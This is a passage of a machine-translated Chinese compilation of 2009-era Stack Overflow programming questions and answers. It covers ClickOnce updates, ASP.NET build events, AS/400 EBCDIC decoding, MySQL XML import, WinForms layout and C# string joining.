    *   通过构建真正的应用程序，给你想要的东西，你会更有动力，你会明白你做得更好，因为所有卷曲的细节都没有像在线或书籍教程中那样为你解决。你可能不会使用最优雅的设计，但你会学到更多。

但是在某些时候，您将需要开始深入研究有关面向对象架构等的书籍，但现在只需进入并强迫您的大脑学习。

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2009-04-06T14:37:15.950

在这里实际进行一些编码的另一票。如果您不喜欢书中的练习，请尝试编写您个人感兴趣的东西。在我学习 C# 的过程中，我正在编写一个程序来关联和显示照片和 GPS 轨迹，作为衍生产品，我正在尝试在 WPF 中编写一个 3D 图形组件。遇到一个我真正感兴趣的真正问题对我来说有很大的不同，你可能会有点厌倦银行账户类和车辆的实现。

* * *

## 回答 #13

> 赞同：0
> 
> 时间：2010-06-02T19:54:22.683

我推荐斯坦福课程 CS106A，可以免费下载，也可以在 iTunes 上找到。课程很棒，老师很热情： http:
[//www.stanford.edu/class/cs106a/](http://www.stanford.edu/class/cs106a/)

我同意其他人的观点，即 Sun 教程和 Thinking in Java 免费书籍非常出色，但是，我认为它们不能替代该领域的全新视频。

# c# - clickonce 相同的发布版本但程序集版本不同，更新不会发生

> ID：721609
> 
> 赞同：2
> 
> 时间：2009-04-06T14:07:16.007
> 
> 标签：c#, deployment, clickonce

我已经部署了一个 clickonce 应用程序，在我的应用程序中我有 10 个外部 dll。由于我的 dll 文件中的代码不断变化并且很难重新分发，我采用了 clickonce 部署策略。但我想知道一件事，如果我对其中一个 dll 文件进行更改并将其程序集版本从 1.0.0.0 升级到 1.0.0.1，但不更改发布版本，它仍然是 1.0.0.0。此外，我已将更新设置设置为在应用程序加载之前。我重新运行了安装部署，但它没有运行更新的程序集。怎么了？我正在使用 VS2008 和 C#.NET 2.0

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-04-06T14:15:21.727

ClickOnce 只关心整个项目的发布版本。在“我的项目”发布选项卡中增加此项并再次发布。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-04-06T18:17:15.903

我想补充[汤姆的答案](https://stackoverflow.com/questions/721609/clickonce-same-publish-version-but-assembly-version-different-update-not-happeni/721653#721653)。

他是对的，ClickOnce 只关心项目的发布版本。但是，一旦您的应用程序在客户端计算机上启动并且它识别出它不是最新版本，它就会开始比较应用程序清单中的文件哈希（应用程序清单是*没有*“.application”扩展名的那个......看图） . 因此，它只下载已更改的文件；是的，没有代码更改的重新编译仍然是一个更改。

最后一点。客户端下载最新版本时出现的下载进度条始终显示应用程序的整个大小。但是，请放心，它只是下载更改的文件。我已经用带宽监视器进行了测试以确认它。

# asp.net - 在 Visual Studio 2008 中向网站添加构建后事件

> ID：721610
> 
> 赞同：9
> 
> 时间：2009-04-06T14:07:23.120
> 
> 标签：asp.net, visual-studio-2008, web, post-build-event

我在 Visual Studio 2008 中使用“网站”，我想添加一个构建后事件，它将构建时间附加到 web.config 文件中。是否可以？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-04-06T14:33:02.463

恐怕网站不支持此功能，您需要使用 Web 应用程序项目。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-04-06T14:34:15.550

采用 WAP（Web 应用程序项目）路线而不是 WSP（网站项目）的主要好处之一是您能够进行构建后事件。

因此，无论如何都不可能开箱即用。 [这是细节](http://msdn.microsoft.com/en-us/library/aa730880%28VS.80%29.aspx)。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2015-06-18T12:35:46.087

1.  添加一个单独的（空）项目（“.buildstep”），向其中添加自定义构建步骤 - 您必须为主 Web 项目指定目标文件夹，但要使用预定义的环境变量（如 $solutiondir， $platform、$mode 等）。
2.  从主 Web 项目 (Project | Project Dependencies) 向这个新项目添加一个依赖项。
3.  已执行重建 + 验证构建步骤。你完成了。
4.  ;o)

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2014-02-12T18:34:04.060

也许这无关紧要，但是您可以自定义启动选项（使其运行脚本/命令），尽管它只会在您启动项目时触发（Dubug -> Start）。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-02-27T20:30:46.183

一种可能的解决方案是创建一个没有任何文件的空虚拟 C#/VB 项目，并在那里添加必要的批处理脚本作为构建后事件。然后，您可以在发布网站后立即构建该“项目”——额外单击鼠标，但仍然比手动运行要好。我为我们的部署打包走这条路，效果很好。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2018-08-03T11:09:41.933

您可以为网站类型的应用程序创建发布配置文件。 ***.publishproj**应该被创建。然后你可以在那里添加*post*和*pre* build 命令作为**Targets**。

```
<Target Name="BeforeBuildTarget" AfterTargets="BeforeBuild">
    <Exec Command="cmd.exe"></Exec>
</Target>
<Target Name="AfterBuildTarget" AfterTargets="AfterBuild">
    <Exec Command="cmd.exe"></Exec>
</Target> 
```

# c# - C# - 从 AS/400 iSeries 解码数据

> ID：721614
> 
> 赞同：0
> 
> 时间：2009-04-06T14:08:03.803
> 
> 标签：c#, ibm-midrange

我正在使用标准的 .NET OdbcConnection 连接到 AS/400 iSeries 数据库。我可以查询这个数据库。不幸的是，有些字段似乎已编码。如何在 C# 中解码这些值？我尝试了以下方法：

```
string text = string.Empty;
if (bytes.Length > 0)
{
    ASCIIEncoding encoder = new ASCIIEncoding();
    text = encoder.GetString(bytes);
}
return text; 
```

bytes 变量表示需要解码的数据。不幸的是，我没有运气。有人告诉我，如果我在 Windows 机器上设置 ODBC 数据源并选中翻译选项卡中的“将二进制数据 (CCSID65535) 转换为文本”复选框，数据将正确返回。但是，我想使用纯 C#。有任何想法吗？我走远了吗？

谢谢！

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2009-04-06T14:14:03.413

很有可能它正在使用 EBCDIC。你可以尝试使用 Encoding.GetEncoding(37) 或者你可以使用我之前写的[EBCDIC 编码。](http://pobox.com/~skeet/csharp/ebcdic)

# .net - 在调整大小时保持控制纵横比

> ID：721621
> 
> 赞同：1
> 
> 时间：2009-04-06T14:09:24.267
> 
> 标签：.net, panel, resize

我有一个面板控件，里面有一个图片框。调整其所在窗体的大小时，如何保持面板控件的纵横比？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-04-06T14:13:40.967

您需要以某种方式存储纵横比，无论它是您在设计时已知的，还是您只是想在表单的构造函数中计算它`InitializeComponent()`。在您的表单`Resize`事件中，您只需将 Panel 的大小设置为适合该表单的 ClientRectangle 的宽高比的最大矩形。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-04-06T14:11:13.000

使用[Anchor](http://msdn.microsoft.com/en-us/library/system.windows.forms.control.anchor(VS.71).aspx)属性，或将控件放在 DockContainer 中并适当地使用[Dock](http://msdn.microsoft.com/en-us/library/system.windows.forms.control.dock.aspx)属性。

**编辑：**其实这不是你问的，是吗？我的建议是在容器的调整大小事件上手动执行此操作。您需要计算 x 或 y 并在加载图片时应用图片的纵横比。

# macos - Mac OS X 上的 *.rsd 文件是什么？

> ID：721628
> 
> 赞同：-1
> 
> 时间：2009-04-06T14:10:18.853
> 
> 标签：macos

我下载了一个应用程序，它包含一个 *.rsd 文件。那是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-04-06T14:12:16.837

不知道你下载了哪个应用程序，我猜它可能是一个 RealSQLDatabase 文件，由 REALBasic 应用程序使用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-05-24T09:59:58.567

你可以看到[`file`](http://developer.apple.com/documentation/Darwin/Reference/ManPages/man1/file.1.html)有什么要说的。

# c# - 使用 WMI 和 C# 的 CPU 使用率

> ID：721629
> 
> 赞同：1
> 
> 时间：2009-04-06T14:10:28.290
> 
> 标签：c#, wmi, cpu, cpu-usage

如何使用 WMI 在 c# 中检索当前的 CPU 使用率？我已经看到很多使用性能计数器的帖子，但我需要一个可以与远程机器一起使用的解决方案。我还在[这里](http://www.microsoft.com/technet/scriptcenter/resources/qanda/apr05/hey0421.mspx)找到了一个 VB 解决方案，但如果可能的话，我更愿意在 C# 中完成此操作。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-04-06T14:18:01.627

至少可以说，WMI 的性能很混乱。性能计数器适用于远程机器。使用`System.Diagnostics.PerformanceCounterXxx`类，构造函数具有带`machineName`参数的重载。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-04-06T14:16:36.420

来自 sysinternals 的工具“pslist”（它是免费的）可以读取远程机器的使用情况。y 可以在 cmd-box 中启动程序并将结果提取到您的应用程序中。

```
 cmd.StartInfo.FileName = "cmd.com"; 
        cmd.StartInfo.Arguments = "/c pslist ....."; 
        cmd.StartInfo.RedirectStandardOutput = true; 
        cmd.StartInfo.RedirectStandardError  = true; 

        // run process and catch output 
        cmd.Start(); 
        string sOutput = cmd.StandardOutput.ReadToEnd(); 
        cmd.WaitForExit(); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-04-07T18:34:08.600

得到它的工作。使用与此处找到的几乎相同的代码：[http](http://www.csharphelp.com/archives2/archive334.html) ://www.csharphelp.com/archives2/archive334.html原来我有一条错误的路径，我终于解决了：new ManagementPath(string.Format("\\ {0}\root\cimv2",机器名));

# silverlight - 如何禁用 Silverlight 3 子窗口上的退出按钮？

> ID：721637
> 
> 赞同：9
> 
> 时间：2009-04-06T14:12:04.947
> 
> 标签：silverlight, silverlight-3.0

我的意思是右上角标有 X 的小退出/取消按钮。我想实现一个接受用户名/密码的登录对话框，所以显然我不希望用户能够关闭模式弹出窗口。如果无法删除或禁用按钮，那么有什么方法可以拦截关闭事件并停止关闭？

* * *

## 回答 #1

> 赞同：29
> 
> 时间：2009-07-10T17:17:32.437

您可以使用 ChildWindow 的**HasCloseButton**属性来隐藏关闭按钮。

请让我知道这可不可以帮你。

埃齐奎尔·贾迪布

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-04-07T21:54:50.817

下面的代码可以防止 ChildWindow 关闭，从而有效地禁用 X 按钮。修改以适合您的业务逻辑。

```
protected override void OnClosing(System.ComponentModel.CancelEventArgs e)
{
    base.OnClosing(e);
    e.Cancel = true;
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2011-06-07T12:58:24.270

选择子窗口并按 F4。它将显示属性窗口。然后转到**HasCloseButton**属性并取消选中该复选框。

享受

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-15T07:04:31.467

```
HasCloseButton="False" .. 
```

此属性用于隐藏 ChildWindow 中的“X”按钮

# mysql - 从 XML 文件批量插入 MYSQL

> ID：721645
> 
> 赞同：1
> 
> 时间：2009-04-06T14:14:02.837
> 
> 标签：mysql, xml, bulkinsert

我们如何将数据从 XML 文件加载到 Mysql 表中？有没有办法从 XML 文件中读取数据并写入 MySql 数据库。我在 XML 文件中有大量数据。

提前感谢您的帮助。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-04-06T14:49:31.147

试试[LOAD XML](http://dev.mysql.com/doc/refman/6.0/en/load-xml.html)函数（MySQL 6.0）。以下是参考手册中的示例代码：

使用包含以下内容的 XML 文档**person.xml**：

```
<?xml version="1.0"?>
<list>
  <person person_id="1" fname="Pekka" lname="Nousiainen"/>
  <person person_id="2" fname="Jonas" lname="Oreland"/>
  <person person_id="3"><fname>Mikael</fname><lname>Ronström</lname></person>
  <person person_id="4"><fname>Lars</fname><lname>Thalmann</lname></person>
  <person><field name="person_id">5</field><field name="fname">Tomas</field><field name="lname">Ulin</field></person>
  <person><field name="person_id">6</field><field name="fname">Martin</field><field name="lname">Sköld</field></person>
</list> 
```

你会像这样创建一个表：

```
CREATE TABLE person (
    person_id INT NOT NULL PRIMARY KEY,
    fname VARCHAR(40) NULL,
    lname VARCHAR(40) NULL,
    created TIMESTAMP
); 
```

并使用以下命令导入 XML：

```
LOAD XML LOCAL INFILE 'person.xml'
INTO TABLE person
ROWS IDENTIFIED BY '<person>'; 
```

或者，如果您正在运行 MySQL 5.0，您可以使用[LOAD_FILE](http://dev.mysql.com/doc/refman/5.0/en/string-functions.html#function_load-file)将整个 XML 文档作为字符串加载到单个列中，然后使用 MySQL 的 XPath 功能对其进行解析。

MySQL.com 上的这篇文章有更多详细信息：[在 MySQL 5.1 和 6.0 中使用 XML](http://dev.mysql.com/tech-resources/articles/xml-in-mysql5.1-6.0.html)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-04-07T01:36:32.650

如果你正在寻找一个简单的解决方案，Navicat 有一个非常简单的 xml 导入功能。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-04-06T14:32:28.347

为什么不使用 XSL 将 XML 转换为标准 SQL 插入语句，然后使用 mysql 客户端中的“source”命令来读取输出？

# c# - 如何使用 C# 将 .sdf 转换为二进制文件？

> ID：721649
> 
> 赞同：0
> 
> 时间：2009-04-06T14:14:53.227
> 
> 标签：c#, .net

我需要将 .sdf 文件转换为二进制文件。（我认为使用流阅读器？）然后我需要将此二进制文件转换回 .sdf。我该怎么做呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-04-06T14:20:48.873

该文件本身已经是二进制文件，所以我假设您想将该文件作为二进制文件读入内存。试一试：

```
public byte[] ReadBinaryFile(string path)
{    
    byte[] data;

    using (System.IO.FileStream stream = new System.IO.FileStream(path, System.IO.FileMode.Open))
    {
        data = new byte[stream.Length];

        stream.Read(data, 0, data.Length);
    }

    return data;
} 
```

如果要将其写`byte[]`回文件，请执行以下操作：

```
public void WriteBinaryFile(string path, byte[] data)
{
    using (System.IO.FileStream stream = new System.IO.FileStream(path, System.IO.FileMode.Create))
    {
        stream.Write(data, 0, data.Length);
    }
} 
```

* * *

## 编辑

我已经更新了它以将逻辑封装成两个函数。

# search - 搜索 GitHub 的最佳方式是什么？

> ID：721650
> 
> 赞同：15
> 
> 时间：2009-04-06T14:14:55.910
> 
> 标签：search, tags, github, tagging

该网站上的搜索功能似乎很糟糕。

是否有任何外部网站可以更好地使用标签等对项目进行分类？

或者我只是没有正确使用 GitHub？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-04-06T14:49:58.507

您是否尝试过`site:github.com`包含在查询中的 Google 搜索？

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-04-06T14:35:53.160

我没有尝试过，但我知道 Google 在搜索网站方面做得比网站自己的搜索工具做得更好。你试过吗？

转到他们的[高级搜索](http://www.google.com/advanced_search)页面并在“仅从该站点或域返回结果”插槽中填写 github.com。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-25T03:10:26.350

[hubscovery.com](http://hubscovery.com)要好得多。

GitHub 的搜索功能很糟糕。我完全赞成每个人都有自己的观点，但是对于几乎所有其他方面都做得很好的网站，没有理由缺少基本的排序选项。这是为他们服务。

编辑： Hubscovery 已经死了！GitHub 搜索万岁！

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2017-01-05T23:00:29.740

GitHub 索引了大量数据（[50+ 百万个项目](https://github.com/about)）。花点时间了解他们的[搜索语法](https://help.github.com/articles/search-syntax/)应该可以帮助您缩小搜索范围。

# asp.net - 带有 *PAGE* 服务的 AJAX 工具包 AutoCompleteExtender？

> ID：721658
> 
> 赞同：3
> 
> 时间：2009-04-06T14:16:45.047
> 
> 标签：asp.net, autocomplete

我有一个当前使用 AJAX Toolkit AutoCompleteExtender 扩展文本框的应用程序。它使用网络服务来选择和检索数据。该工具包的文档说您也可以使用页面服务，我已经尝试了几天来实现它 - 在 vs2005 和 2.0 框架版本以及 vs2008 和 3.5 框架版本中（页面服务的属性每个版本略有不同）。我无法让任何一个版本都与页面服务一起使用 - 两者都可以与 Web 服务一起正常工作。

有没有人有这方面的运气？

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-04-14T14:04:56.387

您是否检查了以下内容：

*   您的页面方法是（您真的是指页面方法，而不是页面服务？）是静态的。
*   该方法返回一个列表或字符串[]。
*   参数是（字符串前缀文本，整数计数）。订单和案件很重要。

您还可以查看[http://allwrong.wordpress.com/2007/03/13/ms-ajax-autocomplete-extender-using-a-page-method/](http://allwrong.wordpress.com/2007/03/13/ms-ajax-autocomplete-extender-using-a-page-method/)。

/安德烈亚斯

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-04-14T14:45:36.867

您是否使用FireFox中的[Firebug或使用 IE 的](http://getfirebug.com/)[Fiddler](http://fiddler2.com/fiddler2/)查看了您的页面，以实际查看脚本和网络调用发生了什么（如果有的话）？Firebug 的脚本选项卡会很好地向您显示已加载的脚本方法，并在 Net 选项卡上显示浏览器和服务器之间的网络流量，而 Fiddler 主要允许您分析和编辑网络流量。

您使用的是母版页，是母版页上的控件还是页面本身 - 您不能在母版页上拥有页面方法？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-11-18T11:28:10.020

有 +1'd Zalph，因为他的回答告诉了我。该方法必须在页面中。我在用户控件中有我的！

# c# - WinForms：可变数量的动态文本框控件

> ID：721669
> 
> 赞同：1
> 
> 时间：2009-04-06T14:19:26.133
> 
> 标签：c#, .net, winforms

我必须创建可变数量的标签，并在它们旁边创建文本框控件 - 将整个内容排列成一列，每行一个标签和一个文本框。如果我的主窗口小于所有 TextBox 控件的总高度，则不知何故我需要一个可以滚动 TextBoxes 列表的滚动条。按下回车键必须将焦点转移到下一个文本框，并且在文本框过多的情况下也需要滚动。

这是一个相当普遍的问题，我想已经有一些预先准备好的解决方案。

有什么建议吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2009-04-06T14:23:59.133

使用[TableLayoutPanel](http://msdn.microsoft.com/en-us/library/system.windows.forms.tablelayoutpanel.aspx)。您可以动态添加控件，[指定它们的 row/column](http://msdn.microsoft.com/en-us/library/he3sxc2a.aspx)，它将为您维护一个滚动条（使用适当的设置）。它有其怪癖，但应该适合这种情况。

如果您使用 WinForms 设计器来放置 TableLayoutPanel，那么您也可以使用它来定义列的样式。您还可以按照 Tcks 的建议改变每一行的样式。

添加具有指定行/列的控件：

```
int column = 42;
int row = 7;
myTableLayoutPanel.Controls.Add(new TextBox(), column, row); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-04-06T14:29:01.617

此外，在添加一些控件后检查窗口/用户控件的生成代码。它应该让您很好地了解如何动态完成此操作。（我说的是 somename.cs.designer 文件）

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-04-06T14:30:52.983

您可以使用 TableLayoutPanel 作为控件（标签和文本框）的容器，并在代码中动态创建它们。

例子：

```
void Form1_Load( object sender, EventArgs e ) {
    const int COUNT = 10;

    TableLayoutPanel pnlContent = new TableLayoutPanel();
    pnlContent.Dock = DockStyle.Fill;
    pnlContent.AutoScroll = true;
    pnlContent.AutoScrollMargin = new Size( 1, 1 );
    pnlContent.AutoScrollMinSize = new Size( 1, 1 );
    pnlContent.RowCount = COUNT;
    pnlContent.ColumnCount = 3;
    for ( int i = 0; i < pnlContent.ColumnCount; i++ ) {
        pnlContent.ColumnStyles.Add( new ColumnStyle() );
    }
    pnlContent.ColumnStyles[0].Width = 100;
    pnlContent.ColumnStyles[1].Width = 5;
    pnlContent.ColumnStyles[2].SizeType = SizeType.Percent;
    pnlContent.ColumnStyles[2].Width = 100;

    this.Controls.Add( pnlContent );

    for ( int i = 0; i < COUNT; i++ ) {
        pnlContent.RowStyles.Add( new RowStyle( SizeType.Absolute, 20 ) );

        Label lblTitle = new Label();
        lblTitle.Text = string.Format( "Row {0}:", i + 1 );
        lblTitle.TabIndex = (i * 2);
        lblTitle.Margin = new Padding( 0 );
        lblTitle.Dock = DockStyle.Fill;
        pnlContent.Controls.Add( lblTitle, 0, i );

        TextBox txtValue = new TextBox();
        txtValue.TabIndex = (i * 2) + 1;
        txtValue.Margin = new Padding( 0 );
        txtValue.Dock = DockStyle.Fill;
        txtValue.KeyDown += new KeyEventHandler( txtValue_KeyDown );
        pnlContent.Controls.Add( txtValue, 2, i );
    }
}

void txtValue_KeyDown( object sender, KeyEventArgs e ) {
    if ( e.KeyCode == Keys.Enter ) {
        SendKeys.Send( "{TAB}" );
    }
} 
```

# logging - Glassfish 伐木

> ID：721671
> 
> 赞同：12
> 
> 时间：2009-04-06T14:19:32.387
> 
> 标签：logging, glassfish

有没有办法让 glassfish 自动删除一些旧的日志文件？昨天，由于 glassfish 日志记录，我们遇到了磁盘已满问题。在管理控制台中没有明显的方法可以做到这一点，除非我们只是无知。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2009-04-06T14:22:01.150

您可以让 Glassfish 删除日志文件，在日志轮换管理器中：http: [//blogs.oracle.com/sirajg/entry/managing_rotated_log_files](http://blogs.oracle.com/sirajg/entry/managing_rotated_log_files)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2014-10-20T10:50:45.627

在 3.1 中，命令现在是（假设默认值 10 不存在）

```
asadmin> set-log-attributes com.sun.enterprise.server.logging.GFFileHandler.maxHistoryFiles=10 
```

[http://docs.oracle.com/cd/E18930_01/html/821-2416/gklmn.html#gkmai](http://docs.oracle.com/cd/E18930_01/html/821-2416/gklmn.html#gkmai)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-28T11:36:47.540

如果您不能或不想按照其他答案中的建议安装 GlassFish Performance Advisor，另一种方法在[https://wikis.oracle.com/display/GlassFish/FaqDeleteRotatedLogs](https://wikis.oracle.com/display/GlassFish/FaqDeleteRotatedLogs)中进行了描述：

> com.sun.enterprise.server.logging.max_history_files 系统属性限制访问日志记录和服务器日志的轮换日志文件数

# asp.net - 循环浏览 UpdatePanel 中的控件，并访问 javascript

> ID：721672
> 
> 赞同：1
> 
> 时间：2009-04-06T14:19:44.853
> 
> 标签：asp.net, javascript, updatepanel

我正在尝试更新页面上的所有文本框，以将它们转换为如下标签：

```
foreach (Control ctrl in masterform.Controls)
{
    if (ctrl.GetType() == typeof(TextBox))
    {
        TextBox t = ctrl as TextBox;
        t.ReadOnly = true;
        t.BackColor = transparent;
        t.BorderWidth = 0;
    }
} 
```

不幸的是，我将所有文本框都包含在更新面板中，并且无法再访问它们。所以我试过这个：

```
foreach (Control ctrl in masterform.Controls)
{
    if (ctrl is UpdatePanel)
    {
        UpdatePanel s = ctrl as UpdatePanel;
        if (s == PartPanel)
        {
            foreach (Control ctrl2 in s.Controls)
            {
                if (ctrl2 is TextBox)
                {
                    TextBox t = ctrl2 as TextBox;
                    t.ReadOnly = true;
                    t.BackColor = transparent;
                    t.BorderWidth = 0;
                }
            }
        }
    }
} 
```

这仅显示面板控件计数为 1，但内部有大量文本框控件。任何帮助，将不胜感激。

另外，我有相互排斥的复选框，它们的工作方式如下：如果选中#1，则无法选中#2 或#3，同样，如果选中#2 或#3，则无法选中#1。这意味着，如果选中#2 和/或#3，而用户选中#1，则#2 和#3 变为未选中，如果选中#1，而用户选中#2 和/或#3，则#1 变为未选中. 我编写了以下函数来处理它，只要更新面板不更新，它就可以工作：

```
var objChkd;
$(document).ready(function() 
{
    $('.mutuallyexclusive1').click(function () 
    {
        checkedState = $(this).attr('checked');
        $('.mutuallyexclusive2:checked').each(function () 
        {
            $(this).attr('checked', false);
        });
        $(this).attr('checked', checkedState);
    });
    $('.mutuallyexclusive2').click(function () 
    {
        checkedState = $(this).attr('checked');
        $('.mutuallyexclusive1:checked').each(function () 
        {
            $(this).attr('checked', false);
        });
        $(this).attr('checked', checkedState);
    });
});  

<input id="Chk1" type="checkbox" runat="server" class="mutuallyexclusive1" /><br />
<input id="Chk2" type="checkbox"  runat="server" class="mutuallyexclusive2" /><br />
<input id="Chk3" type="checkbox" runat="server" class="mutuallyexclusive2" /><br /> 
```

问题是，当页面加载时，它们可以正常工作，但是如果调用更新面板的 update() 函数，它们似乎会失去与它们应该调用的 javascript 的连接。同样，任何帮助将不胜感激。谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-04-06T14:34:48.717

对于您的 UpdatePanel，请尝试以递归方式查找您的文本框并更新它们：

```
void DisableTextBoxes(Control parent)
{
    foreach (Control ctrl in parent.Controls)
    {
        TextBox t = ctrl as TextBox;
        if (t != null)
        {
            t.ReadOnly = true;
            t.BackColor = transparent;
            t.BorderWidth = 0;
        }
        else
        {
            DisableTextBoxes(ctrl);
        }
    }
}

DisableTextBoxes(masterform); 
```

对于复选框，您的脚本在页面加载时执行，此时事件处理程序绑定到控件。如果复选框是更新的 DOM 的一部分，在`UpdatePanel`刷新期间没有重新加载完整的页面，则事件处理程序不再绑定到它们（它们是**新**元素）。部分刷新页面后，您将需要再次绑定事件。

# java - 如何从 JComponent 上的 paint 方法绘制虚线？

> ID：721675
> 
> 赞同：2
> 
> 时间：2009-04-06T14:20:06.880
> 
> 标签：java, paint

我必须在 JComponent 中绘制虚线或虚线。我怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-04-06T14:23:37.480

抓住一个`Graphics2D`，并使用它的`[setStroke()](http://java.sun.com/j2se/1.3/docs/api/java/awt/Graphics2D.html#setStroke%28java.awt.Stroke%29)`方法来设置一个合适的笔画。`[BasicStroke](http://java.sun.com/j2se/1.3/docs/api/java/awt/BasicStroke.html)`得到一条虚线就足够了，没什么花哨的。

# asp.net-mvc - ASP.Net MVC 控制器命名空间数组

> ID：721700
> 
> 赞同：9
> 
> 时间：2009-04-06T14:26:38.110
> 
> 标签：asp.net-mvc, routing

我注意到 MapRoute 扩展包含一个接受称为“命名空间”的字符串 [] 参数的重载。我阅读了谷歌为我准备的内容，据说这是为了帮助框架在原本不会看到的地方找到控制器。

我做了一些扣球，并尝试将控制器放在奇怪的位置。我在 Scripts 文件夹中放了一个；我什至在具有单独根命名空间的单独程序集中构建了一个。

没有在命名空间参数中添加任何内容，一切正常。如果我只将其中一个命名空间放在命名空间参数中，它仍然可以找到我的所有控制器。我想也许它会使用该数组来消除类似命名的控制器之间的歧义，但这也没有发生。MyProj.Controllers 中的 HomeController 和 SomeOtherName.Stuff 中的 HomeController 仍然会发生冲突。

所以我的问题是，该参数是否已弃用？或者它仍然以某种我尚未辨别的方式使用？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2009-04-06T19:37:46.490

好的，所以经过进一步测试，我发现它不是过滤器，确切地说，但它也是。即使您部分错误，我也给了您“答案”的功劳。

所以，毕竟，它的行为就像我认为的那样，也就是说它消除了歧义。基本上，逻辑流程是这样的：

*   在 _cache 中查找与命名空间数组中匹配的命名空间
    *   如果找到了，请寻找正确名称的控制器
    *   -- 如果找到了，返回它
    *   -- 如果没有找到，返回搜索到它通常看起来的其他任何地方
*   如果没有找到，到处搜索 lese

因此，简而言之，我认为命名空间数组可以消除歧义的想法是正确的。我在这方面的第一次测试失败的原因是它只进行了完美匹配，并且我犯了一个错误，即只使用程序集中的根 n/s（换句话说，使用 MyRoot 而不是 MyRoot.Controllers）。

那么，这个命名空间的东西允许在两个不同的命名空间中有一个 HomeController，并根据 url 或参数以不同的方式匹配它们。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-04-06T14:52:13.247

不，该值未被弃用。它在 DefaultControllerFactory.cs 中使用。请注意，如果提供了该值，它将完全替换搜索的标准名称空间。当未提供参数时，搜索的名称空间由以下方式确定：

```
HashSet<string> nsDefaults = new HashSet<string>(ControllerBuilder.DefaultNamespaces, StringComparer.OrdinalIgnoreCase); 
```

提供参数时，您提供的列表将替换此值。

在任何一种情况下，DefaultControllerFactory 都会调用：

```
GetControllerTypeWithinNamespaces(controllerName, nsDefaults); 
```

...使用列表，可以是您提供的列表，也可以是默认列表。所以很明显，该值是受支持的。

当您查看那里的源代码时，以及在 ControllerTypeCache 中，您可以看到命名空间值的真正用途：它不会导致控制器工厂查看原本不会查看的地方；而是**一个过滤器**。换句话说，它阻止默认控制器工厂查找和命名空间，否则它将搜索控制器。

# c# - 将字符串数组连接到“string1、string2 或 string3”

> ID：721702
> 
> 赞同：11
> 
> 时间：2009-04-06T14:28:22.397
> 
> 标签：c#, .net, string

考虑以下代码：

```
string[] s = new[] { "Rob", "Jane", "Freddy" };

string joined = string.Join(", ", s);

// joined equals "Rob, Jane, Freddy" 
```

出于 UI 原因，我可能很想显示字符串`"Rob, Jane or Freddy"`。

关于最简洁的方法的任何建议？

## 编辑

我正在寻找简洁的类型。因为我只连接少量（<10）的字符串，所以我不担心这里的运行时性能。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2009-04-06T14:31:53.263

输入的简洁含义？还是跑？跑得最快的将是手摇曲柄`StringBuilder`。但要键入，可能（**编辑**句柄 0/1 等）：

```
string joined;
switch (s.Length) {
    case 0: joined = ""; break;
    case 1: joined = s[0]; break;
    default:
        joined = string.Join(", ", s, 0, s.Length - 1)
               + " or " + s[s.Length - 1];
        break;
} 
```

* * *

该`StringBuilder`方法可能类似于：

```
static string JoinOr(string[] values) {
    switch (values.Length) {
        case 0: return "";
        case 1: return values[0];
    }
    StringBuilder sb = new StringBuilder();
    for (int i = 0; i < values.Length - 2; i++) {
        sb.Append(values[i]).Append(", ");
    }
    return sb.Append(values[values.Length-2]).Append(" or ")
        .Append(values[values.Length-1]).ToString();
} 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2009-04-06T14:31:29.690

连接除最后一个以外的所有内容。手动完成最后一个。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2009-04-06T14:30:34.513

在 string[] 上创建一个扩展方法，实现与 string.Join 相同的逻辑，但最后一项将附加“或”。

```
string[] s = new[] { "Rob", "Jane", "Freddy" };

Console.WriteLine(s.BetterJoin(", ", " or ")); 
```

// ---8<----

```
namespace ExtensionMethods
{
    public static class MyExtensions
    {
        public static string BetterJoin(this string[] items, string separator, string lastSeparator)
        {
            StringBuilder sb = new StringBuilder();

            int length = items.Length - 2;
            int i = 0;

            while (i < length)
            {
                sb.AppendFormat("{0}{1}", items[i++], separator);
            }

            sb.AppendFormat("{0}{1}", items[i++], lastSeparator);
            sb.AppendFormat("{0}", items[i]);

            return sb.ToString();
        }
